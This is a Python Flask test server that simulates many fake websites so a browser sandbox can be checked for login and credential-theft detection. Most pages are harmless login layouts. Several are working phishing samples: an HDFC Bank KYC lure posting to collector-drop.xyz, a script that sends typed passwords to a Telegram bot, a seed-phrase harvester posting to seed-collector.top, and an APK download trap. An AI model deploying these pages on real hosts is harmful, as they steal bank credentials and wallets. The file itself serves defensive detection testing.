"""
Sandbox test lab: many fake websites served by ONE local server and told apart by the Host header.
The browser sandbox is started with TRUSTSHIELD_LAB_PORT, which maps every hostname to this server, so
"acme-shop.com", "fresh-bank-kyc.com" ... behave like separate sites without touching the internet.
Nothing here is real; the pages exist to prove the sandbox finds logins and credential theft on ANY site shape.
"""
import threading
import time

from flask import Flask, Response, request

app = Flask(__name__)

FOOTER = ('<footer><a href="/privacy">Privacy Policy</a> <a href="/terms">Terms &amp; Conditions</a> '
          '<a href="/contact">Contact us</a> <a href="/about">About</a></footer>')


def page(title, body, extra_head=""):
    return Response(f"<!doctype html><html lang='en'><head><meta charset='utf-8'><meta name='viewport' content='width=device-width'>"
                    f"<title>{title}</title>{extra_head}</head><body>{body}</body></html>", mimetype="text/html")


def many_links(n=20):
    return " ".join(f'<a href="/p/{i}">Product {i}</a>' for i in range(n))


SITES = {}


def site(host):
    def deco(fn):
        SITES[host] = fn
        return fn
    return deco


# ---- a normal shop: no form on the home page, login is a button -> separate page, form posts to its own domain
@site("acme-shop.com")
def acme(path):
    if path == "":
        return page("Acme Shop - Home", f'<header><a href="/">Acme</a><a class="nav-link" href="/account/login">Log in</a>'
                    f'<a href="/cart">Cart</a></header><h1>Welcome to Acme Shop</h1><p>Great deals every day.</p>{many_links()}{FOOTER}')
    if path == "account/login":
        return page("Acme Shop - Sign in", '<h1>Sign in</h1><form action="/account/session" method="post">'
                    '<input type="email" name="email" placeholder="Email"><input type="password" name="password" placeholder="Password">'
                    f'<button type="submit">Sign in</button></form>{many_links()}{FOOTER}')
    return page("ok", "ok")


# ---- credential theft: brand page, login button, form posts to another domain
@site("fresh-bank-kyc.com")
def kyc(path):
    if path == "":
        return page("HDFC Bank - Update your KYC", '<h1>HDFC Bank</h1><p>Your account will be suspended within 24 hours. '
                    'Verify your KYC immediately to avoid being blocked.</p><button onclick="location=\'/login.html\'">Sign in</button>')
    if path == "login.html":
        return page("HDFC Bank NetBanking Login", '<h1>HDFC Bank NetBanking</h1><form action="http://collector-drop.xyz/post.php" method="post">'
                    '<input name="userid" placeholder="Customer ID"><input type="password" name="pwd" placeholder="Password">'
                    '<button type="submit">Login</button></form>')
    return page("ok", "ok")


# ---- login is inside a modal opened by a button
@site("modal-shop.com")
def modal(path):
    if path == "":
        return page("Modal Shop", f'''<header><button id="b" onclick="document.getElementById('m').style.display='block'">Sign in</button></header>
            <h1>Modal Shop</h1>{many_links()}
            <div id="m" style="display:none;position:fixed;top:5%;left:5%;width:90%;height:80%;background:#fff;z-index:99">
              <form action="/auth" method="post"><input type="email" name="email"><input type="password" name="password"><button>Go</button></form></div>{FOOTER}''')
    return page("ok", "ok")


# ---- login form lives in an embedded frame
@site("frame-login.com")
def frame_login(path):
    if path == "":
        return page("Frame Login", '<h1>Customer area</h1><iframe src="http://login-frame-host.com/widget" width="100%" height="300"></iframe>')
    return page("ok", "ok")


@site("login-frame-host.com")
def frame_host(path):
    return page("widget", '<form action="/in" method="post"><input name="user"><input type="password" name="password"><button>Login</button></form>')


# ---- the form does not exist in the HTML; JavaScript builds it
@site("spa-app.com")
def spa(path):
    return page("SPA App", '<div id="app">Loading...</div><script>setTimeout(function(){document.getElementById("app").innerHTML='
                '\'<form action="/api/login" method="post"><input name="email" type="email"><input name="pw" type="password"><button>Login</button></form>\';},300);</script>')


# ---- a mobile page whose login is hidden behind a hamburger menu
@site("hamburger-menu.com")
def hamburger(path):
    if path == "":
        return page("Burger Menu Site", f'''<header><button aria-label="Menu" class="navbar-toggler" onclick="document.getElementById('nav').style.display='block'">&#9776;</button>
            <nav id="nav" style="display:none"><a href="/members/sign-in">Sign in</a></nav></header><h1>Welcome</h1>{many_links()}{FOOTER}''')
    if path == "members/sign-in":
        return page("Members", '<form action="/members/login" method="post"><input type="email" name="email"><input type="password" name="password"><button>Go</button></form>')
    return page("ok", "ok")


# ---- bot wall
@site("bot-wall.com")
def bot_wall(path):
    return Response("<html><head><title>Just a moment...</title></head><body>Checking your browser before accessing the site.</body></html>",
                    status=403, mimetype="text/html")


# ---- stolen credentials go to a Telegram bot
@site("telegram-kit.com")
def telegram_kit(path):
    return page("Secure Login", '''<h1>Account verification</h1><form id="f"><input name="u" placeholder="Email"><input type="password" name="p" placeholder="Password"><button type="submit">Verify</button></form>
        <script>document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();
        fetch('https://api.telegram.org/bot123456:ABC/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:1,text:document.querySelector('[name=u]').value+' '+document.querySelector('[name=p]').value})});});</script>''')


# ---- the page pushes an APK download
@site("download-trap.com")
def download_trap(path):
    if path == "files/update.apk":
        return Response(b"PK\x03\x04fake", mimetype="application/vnd.android.package-archive",
                        headers={"Content-Disposition": "attachment; filename=update.apk"})
    return page("Update required", '<h1>Install the update</h1><script>setTimeout(function(){location="/files/update.apk"},200)</script>')


# ---- never answers in time
@site("slow-site.com")
def slow(path):
    time.sleep(12)
    return page("slow", "slow")


# ---- ordinary content site: nothing to log into
@site("plain-blog.com")
def blog(path):
    return page("A Plain Blog", f"<h1>Notes on gardening</h1><p>{'Tomatoes need sun. ' * 40}</p>{many_links()}{FOOTER}")


# ---- wallet-phrase harvester
@site("wallet-drainer.com")
def wallet(path):
    return page("Claim your airdrop", '<h1>Connect Wallet to claim your airdrop</h1><p>Congratulations, you have won! Claim now.</p>'
                '<form action="http://seed-collector.top/save" method="post"><textarea name="phrase" placeholder="Enter your 12 word recovery phrase"></textarea>'
                '<button>Claim</button></form>')


# ---- cloaking: a throwaway page that sends every visitor to a famous site
@site("cloak-redirect.com")
def cloak(path):
    return Response("", status=302, headers={"Location": "http://www.google.com/"})


@site("www.google.com")
def fake_google(path):
    return page("Google", "<h1>Google</h1><input name=q placeholder=Search>")


# ---- document-share lure on a free hosting domain
@site("doc-share-lure.herokuapp.com")
def doc_lure(path):
    return page("Document", "<p>A new document has been shared with you. Click on &quot;File&quot; to access the document.</p>"
                "<a href='/open'>File</a>")


@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def dispatch(path):
    host = request.host.split(":")[0].lower()
    handler = SITES.get(host)
    if handler is None:
        return Response("unknown lab host " + host, status=404)
    return handler(path)


def start(port: int = 0):
    """Start the lab on a background thread; returns (port, stop_function)."""
    from werkzeug.serving import make_server
    server = make_server("127.0.0.1", port, app, threaded=True)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server.server_port, server.shutdown
